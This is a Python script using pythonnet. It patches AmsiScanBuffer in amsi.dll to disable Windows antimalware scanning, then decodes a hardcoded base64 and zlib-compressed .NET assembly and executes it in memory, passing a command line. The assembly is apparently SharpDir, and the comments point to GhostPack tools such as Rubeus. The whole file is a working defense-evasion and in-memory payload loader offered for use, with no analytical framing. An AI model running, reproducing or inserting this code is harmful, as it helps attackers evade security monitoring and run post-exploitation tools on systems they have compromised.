import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDir.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()